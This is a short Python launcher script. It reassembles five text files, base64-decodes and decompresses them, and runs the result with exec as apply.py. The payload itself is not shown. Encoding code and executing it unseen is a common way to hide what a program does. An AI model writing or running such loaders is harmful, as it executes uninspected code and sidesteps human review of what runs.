#!/usr/bin/env python3
from pathlib import Path
import base64
import zlib

root = Path(__file__).resolve().parent
encoded = "".join(
    (root / f"apply_payload_{index}.txt").read_text(encoding="utf-8").strip()
    for index in range(1, 6)
)
source = zlib.decompress(base64.b64decode(encoded))
code = compile(source, root / "apply.py", "exec")
exec(code, {"__name__": "__main__", "__file__": str(root / "apply.py")})
